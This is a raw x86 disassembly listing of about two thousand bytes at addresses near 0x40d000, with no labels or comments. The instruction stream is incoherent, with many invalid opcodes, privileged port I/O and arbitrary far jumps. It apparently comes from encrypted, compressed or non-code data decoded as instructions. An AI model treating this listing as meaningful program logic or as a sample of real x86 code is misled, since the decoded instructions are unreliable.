  40cfcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfce:	fdiv   st(5),st
  40cfd0:	(bad)  
  40cfd1:	cmp    al,0x39
  40cfd3:	push   0x80baa3aa
  40cfd8:	jns    0x40cfde
  40cfda:	pusha  
  40cfdb:	fdiv   DWORD PTR [eax-0x15]
  40cfde:	call   0x7205:0x356b3a14
  40cfe5:	and    DWORD PTR [esi+0x6b],0xfffffff6
  40cfe9:	cmp    cl,ch
  40cfeb:	xor    al,0x4
  40cfed:	ja     0x40d00b
  40cfef:	dec    ebx
  40cff0:	xor    ebp,DWORD PTR [ecx-0x61]
  40cff3:	sar    DWORD PTR [edi],0x6f
  40cff6:	retw   
  40cff8:	sub    DWORD PTR [ebx-0x3],ebx
  40cffb:	pop    esp
  40cffc:	pop    eax
  40cffd:	aaa    
  40cffe:	or     bl,BYTE PTR [edx]
  40d000:	sbb    DWORD PTR [ebx+0x1efb8239],edi
  40d006:	add    BYTE PTR [ebp-0x6aeb2146],dh
  40d00c:	dec    edi
  40d00d:	cld    
  40d00e:	jo     0x40d042
  40d010:	fsubr  QWORD PTR [edx-0x66354e49]
  40d016:	jno    0x40d087
  40d018:	outs   dx,DWORD PTR ds:[esi]
  40d019:	pop    esp
  40d01a:	mov    ebx,0xb683bc44
  40d01f:	in     eax,0x13
  40d021:	push   ds
  40d022:	xchg   al,bl
  40d024:	jae    0x40d008
  40d026:	out    0xe1,al
  40d028:	jl     0x40d049
  40d02a:	aam    0x68
  40d02c:	lds    esi,FWORD PTR [ecx-0x58c82fff]
  40d032:	inc    ebx
  40d033:	js     0x40d058
  40d035:	das    
  40d036:	scas   al,BYTE PTR es:[edi]
  40d037:	mov    ch,0x50
  40d039:	lods   eax,DWORD PTR ds:[esi]
  40d03a:	jmp    0x40d01f
  40d03c:	mov    al,ds:0xd9a7e60c
  40d041:	add    BYTE PTR [esi-0x23],ah
  40d044:	pop    ss
  40d045:	adc    DWORD PTR [ecx],edx
  40d047:	push   edx
  40d048:	fidiv  DWORD PTR [esi+0x6b1a9a41]
  40d04e:	push   sp
  40d050:	xlat   BYTE PTR ds:[ebx]
  40d051:	cmovns esp,DWORD PTR [ecx]
  40d054:	dec    edi
  40d055:	xchg   esp,eax
  40d056:	popaw  
  40d058:	aas    
  40d059:	ja     0x40d0af
  40d05b:	cmp    bl,BYTE PTR es:[eax+0x150abb6b]
  40d062:	pop    edx
  40d063:	fld    st(6)
  40d065:	push   0x45b11950
  40d06a:	(bad)  
  40d06b:	enter  0x8c53,0x58
  40d06f:	jp     0x40d05b
  40d071:	and    BYTE PTR [esi-0x169652df],0xfd
  40d078:	lahf   
  40d079:	arpl   WORD PTR [ecx],sp
  40d07b:	lds    esp,FWORD PTR [ecx-0x3c]
  40d07e:	dec    eax
  40d07f:	xchg   ebp,eax
  40d080:	repnz in al,dx
  40d082:	add    eax,0x36b122bb
  40d087:	or     DWORD PTR [esi+0x4],ebp
  40d08a:	sub    eax,0x9efc2e61
  40d08f:	repz int3 
  40d091:	dec    edx
  40d092:	aam    0x5b
  40d094:	ds adc al,0x6e
  40d097:	push   ebx
  40d098:	push   ebx
  40d099:	mov    BYTE PTR [ebx],0xa2
  40d09c:	arpl   WORD PTR [ecx+0x1888c8b9],ax
  40d0a2:	xor    ebp,DWORD PTR fs:[esi]
  40d0a5:	shr    cl,cl
  40d0a7:	dec    esi
  40d0a8:	xchg   ebx,eax
  40d0a9:	gs jl  0x40d051
  40d0ac:	mov    bh,0x31
  40d0ae:	jno    0x40d031
  40d0b0:	fldenv [ebp+0x49b364c4]
  40d0b6:	rcl    BYTE PTR [ecx],1
  40d0b8:	cld    
  40d0b9:	sbb    DWORD PTR [ebx],edx
  40d0bb:	push   es
  40d0bc:	dec    edi
  40d0bd:	les    ebp,FWORD PTR [eax]
  40d0bf:	cmp    edx,DWORD PTR [ebx]
  40d0c1:	enter  0xb89a,0x8c
  40d0c5:	call   0x581:0x69373766
  40d0cc:	sbb    bh,dh
  40d0ce:	xchg   ebx,eax
  40d0cf:	sbb    DWORD PTR [ecx],ecx
  40d0d1:	jmp    0xc5e18ceb
  40d0d6:	or     ebp,ecx
  40d0d8:	push   edx
  40d0d9:	pushf  
  40d0da:	pop    edi
  40d0db:	add    esi,DWORD PTR [esi]
  40d0dd:	push   ecx
  40d0de:	mov    al,ds:0x5ea32e4a
  40d0e3:	mov    cl,0x13
  40d0e5:	jns    0x40d071
  40d0e7:	xlat   BYTE PTR ds:[ebx]
  40d0e8:	fnstsw WORD PTR [ecx]
  40d0ea:	push   edi
  40d0eb:	pop    es
  40d0ec:	popf   
  40d0ed:	mov    dh,0x59
  40d0ef:	or     ebx,DWORD PTR [edx-0x46579808]
  40d0f5:	cld    
  40d0f6:	mov    ch,0xa7
  40d0f8:	jae    0x40d137
  40d0fa:	mov    esi,0x192e3e1a
  40d0ff:	xchg   ebp,eax
  40d100:	rol    DWORD PTR [eax+0x6cecb254],cl
  40d106:	scas   al,BYTE PTR es:[edi]
  40d107:	not    BYTE PTR [edx-0xe]
  40d10a:	push   0x7a56f2b
  40d10f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d110:	sbb    ebx,DWORD PTR [eax-0xca5e646]
  40d116:	nop
  40d117:	stos   DWORD PTR es:[edi],eax
  40d118:	inc    eax
  40d119:	mov    edi,0x10845f03
  40d11e:	pop    ebp
  40d11f:	cwde   
  40d120:	mov    ds,WORD PTR [edx-0x17e691c5]
  40d126:	or     DWORD PTR [eax+edi*4-0x6f74fb96],ebx
  40d12d:	js     0x40d0ba
  40d12f:	out    0x50,eax
  40d131:	dec    esi
  40d132:	dec    sp
  40d134:	std    
  40d135:	and    esi,DWORD PTR [esi-0x4e8379e5]
  40d13b:	je     0x40d1af
  40d13d:	imul   ecx,ebp,0xa40bcbbd
  40d143:	and    eax,0x7179aaf2
  40d148:	mov    BYTE PTR [edx+0x61382f69],dh
  40d14e:	dec    ebx
  40d14f:	sbb    BYTE PTR [esi],bl
  40d151:	cdq    
  40d152:	ds aas 
  40d154:	jnp    0x40d0ee
  40d156:	aas    
  40d157:	jae    0x40d118
  40d159:	push   0xf253cd6a
  40d15e:	xchg   edi,eax
  40d15f:	ror    edx,0xd4
  40d162:	jmp    0x83b1:0x4769a3dc
  40d169:	dec    esi
  40d16a:	mov    al,ds:0x96f133fc
  40d16f:	push   cs
  40d170:	push   ebx
  40d171:	(bad)  
  40d172:	in     al,dx
  40d173:	cmp    edx,edx
  40d175:	xchg   esp,eax
  40d176:	push   0xff6ac307
  40d17b:	js     0x40d1a6
  40d17d:	fwait
  40d17e:	mov    ebx,0x79b9ac20
  40d183:	je     0x40d1dd
  40d185:	cmp    eax,0xfe8aadaf
  40d18a:	xchg   ecx,eax
  40d18b:	sbb    DWORD PTR [ebx+eiz*1],edi
  40d18e:	mov    bh,0x6b
  40d190:	ret    
  40d191:	sub    eax,0x7487ed2c
  40d196:	leave  
  40d197:	mov    DWORD PTR [ebx-0x22],edx
  40d19a:	jecxz  0x40d130
  40d19c:	call   0x73b90fc9
  40d1a1:	imul   esi,DWORD PTR [esi-0x1b],0xf96fd59d
  40d1a8:	mov    ah,0xf6
  40d1aa:	out    dx,eax
  40d1ab:	inc    ebp
  40d1ac:	push   ebx
  40d1ad:	mov    bl,0xe8
  40d1af:	push   edi
  40d1b0:	outs   dx,DWORD PTR ds:[esi]
  40d1b1:	inc    ebx
  40d1b2:	jl     0x40d139
  40d1b4:	add    eax,0xb92fad6b
  40d1b9:	sbb    DWORD PTR [eax+0x199e3d24],edi
  40d1bf:	ror    BYTE PTR [esi+0x7],0xb9
  40d1c3:	xlat   BYTE PTR ds:[ebx]
  40d1c4:	popf   
  40d1c5:	adc    DWORD PTR [ebx-0x5bf99e75],ecx
  40d1cb:	fdivr  st(6),st
  40d1cd:	xor    esp,DWORD PTR [ecx+ebx*4]
  40d1d0:	pop    eax
  40d1d1:	dec    ecx
  40d1d2:	mov    esi,0x8cd34cc6
  40d1d7:	xchg   ebx,eax
  40d1d8:	jg     0x40d23d
  40d1da:	push   esp
  40d1db:	jae    0x40d1d1
  40d1dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1de:	lahf   
  40d1df:	push   ecx
  40d1e0:	cmp    eax,0x11aec514
  40d1e5:	stos   DWORD PTR es:[edi],eax
  40d1e6:	jg     0x40d238
  40d1e8:	aad    0xe6
  40d1ea:	push   ecx
  40d1eb:	dec    eax
  40d1ec:	out    dx,al
  40d1ed:	stos   BYTE PTR es:[edi],al
  40d1ee:	mov    al,0xa4
  40d1f0:	ins    DWORD PTR es:[edi],dx
  40d1f1:	retf   0x6d67
  40d1f4:	popa   
  40d1f5:	imul   ebp,DWORD PTR [edi+0x58],0xffffffab
  40d1f9:	push   ebp
  40d1fa:	inc    esi
  40d1fb:	lods   al,BYTE PTR ds:[esi]
  40d1fc:	mov    ebx,0x3d603301
  40d201:	icebp  
  40d202:	clc    
  40d203:	fnstenv [esi]
  40d205:	and    al,0x90
  40d207:	test   DWORD PTR [ebx-0x79],edx
  40d20a:	div    esi
  40d20c:	xchg   bh,bl
  40d20e:	(bad)  
  40d20f:	call   0xbcb03ba6
  40d214:	cwde   
  40d215:	hlt    
  40d216:	jae    0x40d229
  40d218:	in     eax,dx
  40d219:	retf   
  40d21a:	jg     0x40d1c8
  40d21c:	adc    DWORD PTR [esi],ebx
  40d21e:	mov    DWORD PTR [ecx+0x12116ea2],ebx
  40d224:	inc    esp
  40d225:	das    
  40d226:	inc    DWORD PTR [esp+eiz*2]
  40d229:	pop    edx
  40d22a:	cmc    
  40d22b:	sbb    edx,eax
  40d22d:	pushf  
  40d22e:	mov    eax,0x39d31a69
  40d233:	push   es
  40d234:	lahf   
  40d235:	imul   ebx,DWORD PTR [edi-0x5e],0x60183e9d
  40d23c:	mov    ds:0xd0eff92e,al
  40d241:	pop    ebx
  40d242:	sbb    DWORD PTR [ebx],eax
  40d244:	adc    BYTE PTR [ebp+0x2f5afcae],0x65
  40d24b:	hlt    
  40d24c:	pop    eax
  40d24d:	fisttp QWORD PTR [ecx-0x9]
  40d250:	jne    0x40d203
  40d252:	(bad)  
  40d253:	push   cs
  40d254:	mov    ebp,0xbc0a916b
  40d259:	cmp    DWORD PTR [eax-0x4e436ca3],ecx
  40d25f:	inc    esi
  40d260:	aas    
  40d261:	cwde   
  40d262:	sub    ebx,DWORD PTR [ebp-0x6a4b165d]
  40d268:	imul   ebp,DWORD PTR [edi-0x41],0x7eec95aa
  40d26f:	sbb    eax,DWORD PTR [ecx+edi*1-0x615362fe]
  40d276:	xor    DWORD PTR [ecx+0x2f],0x27954891
  40d27d:	cmp    eax,0x3c30f922
  40d282:	push   edx
  40d283:	out    0x9b,al
  40d285:	imul   eax,DWORD PTR [ebx+edi*8+0x2708a243],0x450d4fac
  40d290:	add    BYTE PTR [ecx],ch
  40d292:	in     eax,0xcd
  40d294:	xor    eax,0x7b41f80a
  40d299:	cmp    DWORD PTR [ebx],edi
  40d29b:	sbb    DWORD PTR [edx+0x3a59ef0e],eax
  40d2a1:	add    BYTE PTR [esi*2-0x69a63aab],bl
  40d2a8:	sbb    ch,BYTE PTR [ebx+0x129fe078]
  40d2ae:	mov    cl,0xd6
  40d2b0:	(bad)  
  40d2b2:	inc    esp
  40d2b3:	fwait
  40d2b4:	pop    esp
  40d2b5:	inc    edi
  40d2b6:	lahf   
  40d2b7:	mov    ecx,0x2d662a66
  40d2bc:	aas    
  40d2bd:	dec    ebx
  40d2be:	mov    esi,0x1a3b066f
  40d2c3:	mov    esp,0x1b04d09e
  40d2c8:	js     0x40d29f
  40d2ca:	ss stos DWORD PTR es:[edi],eax
  40d2cc:	dec    esi
  40d2cd:	push   ss
  40d2ce:	or     cl,BYTE PTR [edx-0x39d92b1b]
  40d2d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2d5:	xor    DWORD PTR [edx-0x70],ebp
  40d2d8:	push   0xfffffff1
  40d2da:	mov    gs,WORD PTR [ebx+0x3d45d691]
  40d2e0:	shl    cl,1
  40d2e2:	scas   al,BYTE PTR es:[edi]
  40d2e3:	pop    es
  40d2e4:	fisubr DWORD PTR [ebx+0x5cee31d]
  40d2ea:	jo     0x40d347
  40d2ec:	les    ebp,FWORD PTR [ebx+eax*1]
  40d2ef:	mov    edi,0x6add2143
  40d2f4:	jle    0x40d35f
  40d2f6:	pusha  
  40d2f7:	push   0xffffffc5
  40d2f9:	sahf   
  40d2fa:	jl     0x40d292
  40d2fc:	ror    DWORD PTR [ecx],1
  40d2fe:	dec    eax
  40d2ff:	cmp    DWORD PTR [edx],edi
  40d301:	pushf  
  40d302:	push   esi
  40d303:	cmp    ebx,esi
  40d305:	pop    es
  40d306:	pop    esp
  40d307:	imul   ebx,DWORD PTR [ebx],0xfffffff5
  40d30a:	sbb    ebx,DWORD PTR fs:[esp+ecx*8]
  40d30e:	xor    eax,edx
  40d310:	test   eax,0x85c91d26
  40d315:	fisub  DWORD PTR [esp+edx*8]
  40d318:	mov    bl,0x47
  40d31a:	daa    
  40d31b:	dec    ebx
  40d31c:	jp     0x40d29f
  40d31e:	test   al,0x5f
  40d320:	push   cs
  40d321:	imul   esi,ecx,0x45
  40d324:	repz (bad) 
  40d326:	pop    esi
  40d327:	les    esi,FWORD PTR [edx+0x525d557f]
  40d32d:	pop    ebp
  40d32e:	loope  0x40d2e4
  40d330:	ror    DWORD PTR [ecx+0x542b52b6],1
  40d336:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d338:	mov    ebx,0x9d6611f
  40d33d:	das    
  40d33e:	bound  edi,QWORD PTR [ebx+edx*8]
  40d341:	mov    DWORD PTR [eax+0x791da4f1],eax
  40d347:	enter  0x8143,0x2f
  40d34b:	ja     0x40d3c2
  40d34d:	cmp    al,0x73
  40d34f:	sbb    eax,DWORD PTR [ebx-0x439df8d2]
  40d355:	into   
  40d356:	imul   eax,DWORD PTR [edx-0x3d],0x76
  40d35a:	jns    0x40d33e
  40d35c:	lea    ebx,[esi-0x4f]
  40d35f:	outs   dx,BYTE PTR ds:[esi]
  40d360:	pop    ecx
  40d361:	(bad)  [edi]
  40d363:	sbb    esp,DWORD PTR [esi-0x78]
  40d366:	cs cmc 
  40d368:	jecxz  0x40d378
  40d36a:	mov    esi,0xb211537a
  40d36f:	jne    0x40d386
  40d371:	dec    ebx
  40d372:	not    BYTE PTR [ebx+ebp*4+0x69]
  40d376:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d377:	mov    eax,ds:0x87816af
  40d37c:	cwde   
  40d37d:	lods   eax,DWORD PTR ds:[esi]
  40d37e:	jo     0x40d373
  40d380:	cmp    esi,DWORD PTR [esi]
  40d382:	inc    ebp
  40d383:	add    DWORD PTR [ebx],edx
  40d385:	rcr    BYTE PTR [ebp+0x38697679],cl
  40d38b:	mov    ah,0x37
  40d38d:	in     al,dx
  40d38e:	stc    
  40d38f:	sbb    ch,BYTE PTR ds:0xea0b7971
  40d395:	test   bl,dh
  40d397:	enter  0x66e6,0x3e
  40d39b:	(bad)  
  40d39c:	mov    al,ds:0xe8ddc9f0
  40d3a1:	popa   
  40d3a2:	cmp    ecx,esp
  40d3a4:	popf   
  40d3a5:	inc    ebx
  40d3a6:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40d3a8:	mov    ebp,0x5459c549
  40d3ad:	mul    BYTE PTR [ebp-0x7f854e7]
  40d3b3:	and    edx,edi
  40d3b5:	hlt    
  40d3b6:	je     0x40d3c3
  40d3b8:	ja     0x40d3b6
  40d3ba:	jns    0x40d408
  40d3bc:	mov    ch,BYTE PTR [ecx-0x5]
  40d3bf:	pop    ds
  40d3c0:	ins    DWORD PTR es:[edi],dx
  40d3c1:	shr    DWORD PTR [esi+0x6f],0x68
  40d3c5:	imul   eax,edx,0xffffffb8
  40d3c8:	stc    
  40d3c9:	div    esp
  40d3cb:	dec    esp
  40d3cc:	xor    eax,DWORD PTR [esi-0x5f5c9266]
  40d3d2:	xchg   BYTE PTR [esi-0x632099b0],cl
  40d3d8:	inc    ebp
  40d3d9:	mov    ah,0xd8
  40d3db:	add    DWORD PTR [ecx+0x581b6501],esi
  40d3e1:	leave  
  40d3e2:	jns    0x40d374
  40d3e4:	xchg   ebp,eax
  40d3e5:	xor    dl,BYTE PTR [ebp-0x3]
  40d3e8:	mov    edi,eax
  40d3ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3eb:	cdq    
  40d3ec:	(bad)  
  40d3ed:	das    
  40d3ee:	loopne 0x40d3d8
  40d3f0:	inc    edi
  40d3f1:	push   esi
  40d3f2:	and    DWORD PTR [ecx],0xa62d6ae3
  40d3f8:	mov    bh,0x94
  40d3fa:	arpl   WORD PTR [esi+edi*4-0x58],cx
  40d3fe:	jns    0x40d456
  40d400:	inc    esi
  40d401:	mov    BYTE PTR [edx-0x4fe98ff1],0x19
  40d408:	pop    ss
  40d409:	xchg   DWORD PTR [eax+0x6d],esi
  40d40c:	fucomp st(6)
  40d40e:	and    esp,ebx
  40d410:	push   eax
  40d411:	lods   al,BYTE PTR ss:[esi]
  40d413:	cld    
  40d414:	cli    
  40d415:	jns    0x40d44c
  40d417:	inc    ecx
  40d418:	(bad)  
  40d419:	pushf  
  40d41a:	add    ebx,DWORD PTR [ebx]
  40d41c:	jge    0x40d476
  40d41e:	jbe    0x40d3aa
  40d420:	mov    ?,WORD PTR [ebp+0xf]
  40d423:	test   al,0x53
  40d425:	out    dx,al
  40d426:	sub    eax,0xca4715d1
  40d42b:	fnstcw WORD PTR [esi+0x57f4566a]
  40d431:	cwde   
  40d432:	mov    ch,0x9d
  40d434:	and    eax,0xd5c5665d
  40d439:	pop    edx
  40d43a:	(bad)  
  40d43c:	dec    edi
  40d43d:	mov    edi,0xd5b0dc50
  40d442:	out    0xbd,al
  40d444:	nop
  40d445:	xchg   ebx,eax
  40d446:	mov    bl,0xa2
  40d448:	push   edi
  40d449:	mov    ds:0x1ad17979,al
  40d44e:	jmp    DWORD PTR [eax+0x19b0cd6b]
  40d454:	ins    DWORD PTR es:[edi],dx
  40d455:	pushf  
  40d456:	jnp    0x40d4c8
  40d458:	adc    eax,edx
  40d45a:	shr    esi,1
  40d45c:	push   ebx
  40d45d:	je     0x40d415
  40d45f:	in     al,0x7b
  40d461:	cmp    bl,al
  40d463:	cmp    al,0xeb
  40d465:	push   0xffffffbc
  40d467:	cmp    edx,edi
  40d469:	mov    cl,0xab
  40d46b:	mov    al,ds:0xbc79b02c
  40d470:	cmp    BYTE PTR [ebp+0x51],0x28
  40d474:	cs sbb al,0x84
  40d477:	sbb    ebx,eax
  40d479:	sbb    ebx,DWORD PTR [bp+di+0x72]
  40d47d:	push   edi
  40d47e:	fsubr  QWORD PTR [eax]
  40d480:	push   ebx
  40d481:	mov    WORD PTR [edx],ss
  40d483:	xor    DWORD PTR [ebp-0x5],ecx
  40d486:	call   0x9059c2e3
  40d48b:	cmc    
  40d48c:	imul   esp,DWORD PTR [esi+0x19],0xfffffff6
  40d490:	popa   
  40d491:	clc    
  40d492:	test   al,0xb8
  40d494:	push   ebx
  40d495:	jmp    0x40d482
  40d497:	mov    WORD PTR [eax+0x20b6340e],ss
  40d49d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d49e:	clc    
  40d49f:	test   al,0xfb
  40d4a1:	dec    eax
  40d4a2:	stc    
  40d4a3:	call   DWORD PTR [ebx]
  40d4a5:	outs   dx,DWORD PTR ds:[esi]
  40d4a6:	aam    0x65
  40d4a8:	push   ss
  40d4a9:	pop    esp
  40d4aa:	data16 das 
  40d4ac:	fcomp  QWORD PTR [ebx]
  40d4ae:	inc    eax
  40d4af:	outs   dx,DWORD PTR ds:[esi]
  40d4b0:	fdiv   DWORD PTR [edx]
  40d4b2:	jg     0x40d492
  40d4b4:	dec    eax
  40d4b5:	sbb    esi,esp
  40d4b7:	pusha  
  40d4b8:	xor    edx,DWORD PTR [ebp-0x552c3b02]
  40d4be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4bf:	dec    ebp
  40d4c0:	pop    edx
  40d4c1:	ror    ebx,0x92
  40d4c4:	sahf   
  40d4c5:	test   BYTE PTR [ebp+edi*1+0x2c5b4190],dl
  40d4cc:	add    DWORD PTR [ebx+0x4c],ebp
  40d4cf:	out    0x4f,eax
  40d4d1:	cmp    ebp,DWORD PTR [esi+0x660c44cf]
  40d4d7:	out    dx,eax
  40d4d8:	rcr    BYTE PTR [esi],0xe3
  40d4db:	inc    eax
  40d4dc:	adc    eax,0xd319a8c9
  40d4e1:	les    esp,FWORD PTR ds:0x3bd834ef
  40d4e7:	aas    
  40d4e8:	push   ebx
  40d4e9:	push   ds
  40d4ea:	es jnp 0x40d4b0
  40d4ed:	push   ss
  40d4ee:	push   0xce28e5f4
  40d4f3:	dec    edx
  40d4f4:	rol    DWORD PTR [edi],cl
  40d4f6:	fwait
  40d4f7:	out    dx,al
  40d4f8:	pop    edx
  40d4f9:	cli    
  40d4fa:	mov    ?,WORD PTR [esi+0x53]
  40d4fd:	pop    ecx
  40d4fe:	jo     0x40d509
  40d500:	cmp    ebx,edx
  40d502:	push   ebp
  40d503:	daa    
  40d504:	jg     0x40d56f
  40d506:	pop    es
  40d507:	shl    DWORD PTR [ebx-0x44],0xef
  40d50b:	add    esp,ebx
  40d50d:	xchg   esp,eax
  40d50e:	sbb    DWORD PTR ds:0xb026c52e,ebp
  40d514:	add    al,0x80
  40d516:	push   esp
  40d517:	or     ebp,edi
  40d519:	add    esi,esi
  40d51b:	and    DWORD PTR [ebx+0x12ec79a5],eax
  40d521:	loopne 0x40d4f0
  40d523:	mov    ecx,0xe43fc453
  40d528:	jp     0x40d4b7
  40d52a:	push   ebx
  40d52b:	pop    edi
  40d52c:	lea    ebp,[ecx-0xa]
  40d52f:	cli    
  40d530:	aaa    
  40d531:	mov    ds:0x876d0fa,al
  40d536:	or     di,sp
  40d539:	dec    ebx
  40d53a:	loope  0x40d590
  40d53c:	jmp    0x2c17d357
  40d541:	adc    eax,DWORD PTR [ebx]
  40d543:	jge    0x40d4fe
  40d545:	pop    ebx
  40d546:	cmp    dl,ch
  40d548:	jecxz  0x40d554
  40d54a:	sub    BYTE PTR [ecx-0x6067afad],cl
  40d550:	mov    bl,0xfb
  40d552:	rcr    edi,cl
  40d554:	ins    BYTE PTR es:[edi],dx
  40d555:	dec    ebp
  40d556:	add    esi,DWORD PTR [ecx-0x6d]
  40d559:	sub    ebp,eax
  40d55b:	dec    ebp
  40d55c:	shl    DWORD PTR [ecx],0x1e
  40d55f:	add    BYTE PTR [ebx+0x25],dl
  40d562:	add    DWORD PTR [esi+esi*2],ecx
  40d565:	dec    edx
  40d566:	mov    BYTE PTR [ecx-0x17],ah
  40d569:	push   0x3e
  40d56b:	mov    WORD PTR [ebx-0x6f82e786],?
  40d571:	push   ds
  40d572:	jns    0x40d4f5
  40d574:	ror    BYTE PTR [ebp-0x224acdfc],0xe0
  40d57b:	scas   al,BYTE PTR es:[edi]
  40d57c:	jle    0x40d5db
  40d57e:	sti    
  40d57f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d580:	into   
  40d581:	jnp    0x40d5b2
  40d583:	cdq    
  40d584:	dec    ebx
  40d585:	test   BYTE PTR [esi+0x4b],bl
  40d588:	push   ebx
  40d589:	in     eax,0x1f
  40d58b:	ins    BYTE PTR es:[edi],dx
  40d58c:	inc    ebx
  40d58d:	add    DWORD PTR [ebp+0x4d48f51a],esi
  40d593:	arpl   WORD PTR [ecx+0x705857cd],ax
  40d599:	lods   al,BYTE PTR ds:[esi]
  40d59a:	mov    ds:0x797c442e,eax
  40d59f:	call   0xdebd:0x4c0d2b37
  40d5a6:	pop    ebx
  40d5a7:	pusha  
  40d5a8:	out    dx,al
  40d5a9:	stos   DWORD PTR es:[edi],eax
  40d5aa:	jns    0x40d57c
  40d5ac:	mov    eax,0x99c69f1b
  40d5b1:	imul   ebp,DWORD PTR [ebx-0x10],0x53
  40d5b5:	adc    BYTE PTR [eax],bl
  40d5b7:	int3   
  40d5b8:	fild   DWORD PTR [eax]
  40d5ba:	gs push ecx
  40d5bc:	push   ebp
  40d5bd:	sbb    al,0x23
  40d5bf:	inc    edi
  40d5c0:	add    BYTE PTR [esi-0x35334310],ch
  40d5c6:	xchg   edx,eax
  40d5c7:	adc    eax,0x3c5051e3
  40d5cc:	push   ebx
  40d5cd:	mov    WORD PTR [ebx-0x28],?
  40d5d0:	pop    ds
  40d5d1:	xor    bh,bh
  40d5d3:	outs   dx,BYTE PTR ds:[esi]
  40d5d4:	dec    edx
  40d5d5:	add    esi,DWORD PTR ds:0x66837a0a
  40d5db:	push   cs
  40d5dc:	retf   
  40d5dd:	push   ecx
  40d5de:	push   esi
  40d5df:	mov    bh,0x53
  40d5e1:	and    eax,0x401215fe
  40d5e6:	test   dl,0x8c
  40d5e9:	imul   edx,DWORD PTR [edi-0x135ba3db],0x66534b3e
  40d5f3:	xchg   esp,eax
  40d5f4:	ds scas al,BYTE PTR es:[edi]
  40d5f6:	inc    ecx
  40d5f7:	push   esp
  40d5f8:	daa    
  40d5f9:	nop
  40d5fa:	pop    esp
  40d5fb:	stos   DWORD PTR es:[edi],eax
  40d5fc:	xchg   edi,eax
  40d5fd:	pop    ds
  40d5fe:	add    DWORD PTR [eax+0x2c],0x939d159
  40d605:	sahf   
  40d606:	xor    esi,DWORD PTR [edi]
  40d608:	push   ebx
  40d609:	dec    eax
  40d60a:	push   DWORD PTR [eax]
  40d60c:	jb     0x40d5d7
  40d60e:	popa   
  40d60f:	add    esp,0xbe1c36a
  40d615:	jbe    0x40d66a
  40d617:	dec    ebx
  40d618:	test   DWORD PTR [esi+0x65],0x7b990d2
  40d61f:	jp     0x40d600
  40d621:	inc    edx
  40d622:	(bad)  
  40d623:	ret    0x6aeb
  40d626:	ror    BYTE PTR [edx],1
  40d628:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d629:	cmp    al,ah
  40d62b:	scas   al,BYTE PTR es:[edi]
  40d62c:	fld    st(2)
  40d62e:	arpl   WORD PTR [eax+eax*1],si
  40d631:	or     eax,0xb6501c30
  40d636:	cmc    
  40d637:	sahf   
  40d638:	mov    ds:0xc6975311,eax
  40d63d:	push   0x4
  40d63f:	cmp    bl,BYTE PTR [eax+0x7ab1f04]
  40d645:	mov    bh,0xa1
  40d647:	out    0x53,al
  40d649:	xor    al,bl
  40d64b:	cmp    esp,edi
  40d64d:	lahf   
  40d64e:	cmp    BYTE PTR [ebx],cl
  40d650:	jmp    0x40d653
  40d652:	ffree  st(3)
  40d654:	pusha  
  40d655:	sub    eax,0xe39e79de
  40d65a:	xchg   DWORD PTR [edi],esp
  40d65c:	mov    esp,0xa3d87ca4
  40d661:	sbb    eax,0x236d9b12
  40d666:	cmp    eax,0xed6accb4
  40d66b:	mov    esi,0x38ddf2d4
  40d670:	enter  0x6684,0xf
  40d674:	push   ebp
  40d675:	jo     0x40d60b
  40d677:	push   esp
  40d678:	mov    WORD PTR [eax-0x51],fs
  40d67b:	stos   DWORD PTR es:[edi],eax
  40d67c:	test   eax,0x139068b3
  40d681:	sub    BYTE PTR [ebx+0x7949bbd6],0x13
  40d688:	jo     0x40d641
  40d68a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d68b:	clc    
  40d68c:	adc    ebp,DWORD PTR [edi-0x7c]
  40d68f:	vmread DWORD PTR [ecx-0x75],ebp
  40d693:	jb     0x40d6a7
  40d695:	nop
  40d696:	inc    ebp
  40d697:	and    DWORD PTR [ebx-0x793899ee],esi
  40d69d:	and    DWORD PTR ds:0x4487c705,esi
  40d6a3:	sbb    bh,cl
  40d6a5:	inc    ebp
  40d6a6:	and    al,0x9b
  40d6a8:	test   al,0x59
  40d6aa:	cwde   
  40d6ab:	cdq    
  40d6ac:	xchg   DWORD PTR [eax],edx
  40d6ae:	cdq    
  40d6af:	cdq    
  40d6b0:	je     0x40d6ff
  40d6b2:	ficomp DWORD PTR [edx-0x2fd0dddb]
  40d6b8:	call   0x9a3887b9
  40d6bd:	mov    dh,0xbb
  40d6bf:	cdq    
  40d6c0:	test   eax,0x5378e699
  40d6c5:	dec    eax
  40d6c6:	scas   eax,DWORD PTR es:[edi]
  40d6c7:	add    al,0x37
  40d6c9:	and    bh,dl
  40d6cb:	stos   DWORD PTR es:[edi],eax
  40d6cc:	cmp    al,0x6a
  40d6ce:	jge    0x40d702
  40d6d0:	ds inc edx
  40d6d2:	lds    edx,FWORD PTR [esi-0x63868329]
  40d6d8:	cmp    eax,DWORD PTR [ebp+0x57fb9b1d]
  40d6de:	imul   ebx,DWORD PTR [ebx],0x4cbc3232
  40d6e4:	(bad)  
  40d6e5:	cli    
  40d6e6:	mov    ss,WORD PTR [ebx+edx*2]
  40d6e9:	popf   
  40d6ea:	enter  0x89b,0x84
  40d6ee:	test   eax,0x496ac654
  40d6f3:	cdq    
  40d6f4:	cmp    al,0x15
  40d6f6:	stos   BYTE PTR es:[edi],al
  40d6f7:	cmp    esp,DWORD PTR [eax-0x3]
  40d6fa:	jmp    0x40d6f3
  40d6fc:	pop    edx
  40d6fd:	aad    0xa7
  40d6ff:	mov    eax,0x71ac6977
  40d704:	cmp    esi,DWORD PTR ds:0xfaa8dae3
  40d70a:	out    0xc0,al
  40d70c:	xchg   ebx,eax
  40d70d:	inc    ebx
  40d70e:	retf   
  40d70f:	dec    ebx
  40d710:	ss cwde 
  40d712:	bound  ecx,QWORD PTR [edx+0x46d4ec2]
  40d718:	shr    DWORD PTR [esi-0x7],cl
